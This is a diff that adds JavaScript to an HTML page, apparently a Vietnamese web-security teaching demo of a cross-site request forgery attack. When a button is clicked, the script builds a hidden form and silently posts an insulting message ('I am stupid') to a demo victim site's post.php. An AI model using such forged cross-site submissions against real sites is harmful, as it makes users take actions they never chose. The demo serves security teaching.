@@ -38,5 +38,29 @@
             <p>Demo CSRF Attack - Bảo mật web và ứng dụng</p>
         </footer>
     </div>
+
+    <script>
+        document.getElementById('attack-button').addEventListener('click', function() {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '../victim_site/post.php';
+            form.style.display = 'none';
+
+            var content = document.createElement('input');
+            content.type = 'hidden';
+            content.name = 'content';
+            content.value = 'Tôi bị ngu';
+
+            form.appendChild(content);
+            document.body.appendChild(form);
+            document.getElementById('attack-result').innerHTML = 'Đang thực hiện tấn công...';
+            
+            form.submit();
+            
+            setTimeout(function() {
+                document.getElementById('attack-result').innerHTML = 'Tấn công thành công! Kiểm tra trang web đích để xem bài đăng mới.';
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
